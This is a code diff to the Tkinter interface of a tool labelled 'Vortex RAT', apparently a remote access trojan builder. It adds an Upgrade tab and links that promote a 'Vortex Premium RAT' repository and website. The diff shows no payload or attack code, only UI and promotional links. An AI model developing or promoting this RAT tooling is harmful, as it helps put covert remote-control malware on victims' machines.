@@ -49,6 +49,10 @@ def find_python():
 import webbrowser
 
 
+PREMIUM_REPO_URL = "https://github.com/Ansh-Vortex/Vortex-Premium-RAT"
+OFFICIAL_SITE_URL = "https://vortexcodes.org"
+
+
 # ============================================================
 # THEME COLORS
 # ============================================================
@@ -107,6 +111,7 @@ class BuilderApp:
         self.pages = {}
         self._build_setup_page()
         self._build_builder_page()
+        self._build_upgrade_page()
         self._build_donate_page()
 
         # Show initial page
@@ -130,7 +135,7 @@ class BuilderApp:
         tk.Label(title_text, text="Vortex RAT",
                  font=("Segoe UI", 18, "bold"),
                  bg=COLORS['bg_dark'], fg=COLORS['text']).pack(anchor="w")
-        tk.Label(title_text, text="Configure • Build • Deploy",
+        tk.Label(title_text, text="Free Edition • Upgrade at vortexcodes.org",
                  font=("Segoe UI", 9),
                  bg=COLORS['bg_dark'], fg=COLORS['text_muted']).pack(anchor="w")
 
@@ -154,6 +159,7 @@ class BuilderApp:
         tabs = [
             ("📋  Setup Guide", "setup"),
             ("🔨  Builder", "builder"),
+            ("🚀  Upgrade", "upgrade"),
             ("💖  Donate", "donate"),
         ]
 
@@ -597,6 +603,71 @@ class BuilderApp:
         self.icon_entry.has_placeholder = True
         self.icon_entry.config(state="readonly")
         self.icon_path_var.set("")
+
+    def _open_url(self, url):
+        """Open a project link in the default browser."""
+        try:
+            webbrowser.open(url)
+        except Exception as e:
+            messagebox.showerror("Open Link", f"Could not open link:\n{url}\n\n{e}")
+
+    def _link_button(self, parent, text, url, bg=None):
+        btn = tk.Button(
+            parent, text=text,
+            font=("Segoe UI", 10, "bold"),
+            bg=bg or COLORS['accent'], fg=COLORS['text'],
+            activebackground=COLORS['accent_hover'],
+            activeforeground=COLORS['text'],
+            relief="flat", bd=0, cursor="hand2",
+            command=lambda: self._open_url(url),
+            padx=14, pady=9)
+        btn.pack(fill="x", pady=(8, 0))
+        btn.bind("<Enter>", lambda e: btn.config(bg=COLORS['accent_hover']))
+        btn.bind("<Leave>", lambda e: btn.config(bg=bg or COLORS['accent']))
+        return btn
+
+    # ============================================================
+    # UPGRADE PAGE
+    # ============================================================
+    def _build_upgrade_page(self):
+        page = tk.Frame(self.content_frame, bg=COLORS['bg_dark'])
+        self.pages["upgrade"] = page
+
+        tk.Label(page, text="Upgrade to Vortex Premium",
+                 font=("Segoe UI", 16, "bold"),
+                 bg=COLORS['bg_dark'], fg=COLORS['text']).pack(anchor="w", pady=(5, 2))
+        tk.Label(page, text="This is the free edition. Get the premium Vortex release from the official links below.",
+                 font=("Segoe UI", 9),
+                 bg=COLORS['bg_dark'], fg=COLORS['text_muted'],
+                 wraplength=540, justify="left").pack(anchor="w", pady=(0, 18))
+
+        promo_card = tk.Frame(page, bg=COLORS['bg_card'], highlightthickness=1,
+                              highlightbackground=COLORS['border'])
+        promo_card.pack(fill="x")
+        promo_inner = tk.Frame(promo_card, bg=COLORS['bg_card'])
+        promo_inner.pack(fill="x", padx=20, pady=20)
+
+        tk.Label(promo_inner, text="🚀",
+                 font=("Segoe UI", 36),
+                 bg=COLORS['bg_card'], fg=COLORS['accent']).pack(pady=(0, 5))
+        tk.Label(promo_inner, text="Vortex Premium RAT",
+                 font=("Segoe UI", 15, "bold"),
+                 bg=COLORS['bg_card'], fg=COLORS['text']).pack()
+        tk.Label(promo_inner,
+                 text="Want the premium version? Visit the official Vortex website or open the premium GitHub repository.",
+                 font=("Segoe UI", 9),
+                 bg=COLORS['bg_card'], fg=COLORS['text_dim'],
+                 justify="center", wraplength=480).pack(pady=(6, 12))
+
+        self._link_button(promo_inner, "🌐  Open vortexcodes.org", OFFICIAL_SITE_URL)
+        self._link_button(promo_inner, "⭐  Open Premium GitHub", PREMIUM_REPO_URL, COLORS['bg_input'])
+
+        footer = tk.Frame(page, bg=COLORS['bg_input'])
+        footer.pack(fill="x", pady=(15, 0))
+        tk.Label(footer,
+                 text="Free Edition: Vortex Advance RAT\nPremium Edition: Vortex Premium RAT",
+                 font=("Segoe UI", 9), bg=COLORS['bg_input'],
+                 fg=COLORS['text_dim'], justify="center", pady=10).pack()
 
     # ============================================================
     # DONATE PAGE
